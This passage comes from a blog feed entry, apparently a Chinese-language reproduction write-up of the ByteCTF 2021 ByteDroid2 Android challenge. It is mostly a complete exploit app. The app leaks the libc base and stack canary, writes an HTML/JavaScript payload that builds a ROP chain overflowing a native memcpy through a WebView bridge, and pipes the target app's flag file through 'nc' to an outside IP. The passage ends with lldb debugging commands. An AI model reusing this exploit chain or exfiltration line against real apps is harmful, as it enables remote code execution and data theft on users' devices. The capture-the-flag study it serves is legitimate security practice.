‘commons-io:commons-io:2.6’</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbytedroid2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.Manifest;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageManager;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.annotation.RequiresApi;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;101.43.26.67&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequiresApi(api = Build.VERSION_CODES.M)</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (PackageManager.PERMISSION_GRANTED != checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)) &#123;</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.loadLibrary(<span class="string">&quot;Utils&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">canary</span> <span class="operator">=</span> Integer.toHexString(getCanary());</span><br><span class="line">        <span class="type">String</span> <span class="variable">libcBase</span> <span class="operator">=</span> getLibcBase();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/sdcard/Documents/Bytedroid2&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path + <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">            IOUtils.write(getPayload(libcBase, canary),fileOutputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getPackageManager().getLaunchIntentForPackage(<span class="string">&quot;com.bytectf.bytedroid2&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;crash&quot;</span>, <span class="keyword">new</span> <span class="title class_">CrashParcelable</span>());</span><br><span class="line">        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">        sleep(<span class="number">3000</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;crash&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">getCanary</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getLibcBase</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">libcBase</span> <span class="operator">=</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">i</span> <span class="operator">=</span> IOUtils.toString(fileInputStream);</span><br><span class="line">            <span class="keyword">for</span> (String line: i.split(<span class="string">&quot;\n&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(line.contains(<span class="string">&quot;libc.so&quot;</span>))&#123;</span><br><span class="line">                    libcBase = line.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> libcBase;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getPayload</span><span class="params">(String libcBase, String canary)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;button style=\&quot;width:200px;height:200px;font-size: 30px;\&quot; onclick=\&quot;poc()\&quot;&gt;poc&lt;/button&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;button style=\&quot;width:200px;height:200px;font-size: 30px;\&quot; onclick=\&quot;location.href=location.href\&quot;&gt;F5&lt;/button&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;script&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function toLittleEdian(s) &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    return s.slice(6, 8) + s.slice(4, 6) + s.slice(2, 4) + s.slice(0, 2);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function u32(data)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    return parseInt(toLittleEdian(data), 16)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function p32(data)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    return toLittleEdian(data.toString(16).padStart(8,&#x27;0&#x27;))\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function str2hex(str)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  var arr = [];\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  for(var i=0;i&lt;str.length;i++)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    arr.push(str.charCodeAt(i).toString(16));\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  return arr.join(&#x27;&#x27;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function poc()&#123;\n&quot;</span> +</span><br><span class="line">                String.format(<span class="string">&quot;    libc_base = 0x%s\n&quot;</span>, libcBase) +</span><br><span class="line">                String.format(<span class="string">&quot;    canary = 0x%s\n&quot;</span>, canary) +</span><br><span class="line">                <span class="string">&quot;    system = 0x89d20\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload = &#x27;&#x27;.padEnd(0x80*2, &#x27;0&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(canary)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(system+libc_base).repeat(8)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;// 0x000aa692 : pop ecx ; ret\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;// 0x0005dbe8 : sub eax, ecx ; ret\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;// 0x000596f5 : add eax, ecx ; ret\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;// 0x0004415b : push eax ; call esi\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(libc_base+0x000aa692)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(0xb4)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(libc_base+0x000596f5)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(libc_base+0x0004415b)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                String.format( <span class="string">&quot;    payload += str2hex(&#x27;cat /data/data/com.bytectf.bytedroid2/files/flag | nc %s 37203&#x27;)\n&quot;</span>, ip) +</span><br><span class="line"><span class="comment">//                &quot;    payload += str2hex(&#x27;touch /data/data/com.bytectf.bytedroid2/flag&#x27;)\n&quot; +</span></span><br><span class="line">                <span class="string">&quot;    payload += &#x27;00&#x27;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    BridgeUtils.func(payload)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;poc()\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/script&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">int</span> ms)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(ms);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">android_command</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String temp;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;);</span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            <span class="keyword">while</span> ((temp = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                buffer.append(temp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> buffer.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getPackageManager().getLaunchIntentForPackage:让系统返回像用户点击桌面图标一样启动该 App的 Intent</p><p>下面的HTML 把 flag 通过 <code>nc</code> 发到攻击者机器</p><p>调用链是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"> → BridgeUtils.func(hex)</span><br><span class="line"> → Java func(String)</span><br><span class="line"> → unhex()</span><br><span class="line"> → native memcpy(buf, ...)</span><br><span class="line"> → 栈溢出</span><br><span class="line"> → ROP</span><br></pre></td></tr></table></figure><p>调试使用lldb，可以用android studio的或者lldb -server调试</p><p>确认架构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure><p>把 lldb-server 推到设备</p><p><code>lldb-server</code> 在 NDK 里，一般路径类似：</p><p><code>.../Android/Sdk/ndk/&lt;ver&gt;/toolchains/llvm/prebuilt/&lt;host&gt;/lib64/clang/&lt;ver&gt;/lib/linux/&lt;arch&gt;/lldb-server</code>（不同版本略有差异）</p><p>推到设备：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb push lldb-server /data/local/tmp/lldb-server</span><br><span class="line">adb shell chmod 755 /data/local/tmp/lldb-server</span><br></pre></td></tr></table></figure><blockquote><p>如果你找不到 lldb-server，最简单是直接用 Android Studio 自带的 NDK&#x2F;LLDB，或用 <code>ndk-which lldb-server</code>（有的环境支持）。</p></blockquote><p>启动目标 App，并拿 PID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pidof com.bytectf.bytedroid2</span><br></pre></td></tr></table></figure><p>在设备上启动 lldb-server attach 到 PID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell /data/local/tmp/lldb-server platform --listen &quot;*:12345&quot; --server</span><br></pre></td></tr></table></figure><p>（有的也用 gdbserver 风格命令，但现在更推荐 <code>platform --listen</code> 这种。）</p><p>本机端口转发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:12345 tcp:12345</span><br></pre></td></tr></table></figure><p>本机启动 lldb 连接</p><p>在电脑上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lldb</span><br></pre></td></tr></table></figure><p>进入 lldb 后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">platform select remote-android</span><br><span class="line">platform connect connect://127.0.0.1:12345</span><br></pre></td></tr></table></figure><p>然后 attach（两种方式）：</p><p>按 PID attach：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process attach -p &lt;PID&gt;</span><br></pre></td></tr></table></figure><p>或按进程名（有时不稳定）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process attach -n com.bytectf.bytedroid2</span><br></pre></td></tr></table></figure><p>下断点到 memcpy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">breakpoint set -n memcpy</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><p>当断住后常看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bt</span><br><span class="line">register read</span><br></pre></td></tr></table></figure><p>想看当前栈顶附近：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">register read sp</span><br><span class="line">memory read --format x --size 4 --count 64 $sp</span><br></pre></td></tr></table></figure><p>想看 libc 基址&#x2F;模块列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image list</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-ByteDroid2复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-ByteDroid2复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 ByteDroid2复现&quot;&gt;&lt;/a&gt;ByteCTF2021 By</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
</feed>
